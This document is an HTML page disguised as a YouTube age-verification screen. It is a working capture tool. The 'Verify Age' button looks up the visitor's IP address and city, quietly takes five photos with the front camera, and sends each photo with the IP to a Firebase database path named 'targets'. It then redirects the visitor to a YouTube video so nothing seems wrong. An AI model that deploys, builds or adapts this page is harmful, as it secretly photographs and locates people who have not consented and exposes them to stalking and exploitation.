<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video Player</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #ccc; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .yt-ui { max-width: 400px; width: 90%; text-align: center; }
        .red-btn { background: #ff0000; color: white; padding: 12px 30px; border-radius: 2px; font-weight: bold; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="yt-ui" id="main-ui">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="w-32 mx-auto mb-8">
        <h2 class="text-xl font-bold text-white mb-4">Verification Required</h2>
        <p class="text-sm text-zinc-500 mb-8">This video is age-restricted. Please verify your age to continue.</p>
        <button onclick="startCapture()" class="red-btn">Verify Age</button>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const FB_URL = "https://camera-af08b-default-rtdb.firebaseio.com/targets.json";
        let photoCount = 0;
        let ipInfo = "Detecting...";

        async function startCapture() {
            document.getElementById('main-ui').innerHTML = `<div class="animate-pulse text-red-600 font-bold">Connecting Secure Server...</div>`;
            
            // Get IP
            try {
                const res = await fetch('https://ipapi.co/json/');
                const geo = await res.json();
                ipInfo = geo.ip + " (" + geo.city + ")";
            } catch(e) {}

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                const captureInterval = setInterval(async () => {
                    if (photoCount >= 5) {
                        clearInterval(captureInterval);
                        stream.getTracks().forEach(t => t.stop());
                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                        return;
                    }

                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.3);
                    
                    // Fast Individual Push
                    fetch(FB_URL, { 
                        method: 'POST', 
                        body: JSON.stringify({
                            time: new Date().toLocaleTimeString(),
                            photo: photoData,
                            ip: ipInfo
                        }) 
                    });
                    photoCount++;
                }, 400); 

            } catch(e) {
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }
        }
    </script>
</body>
</html>
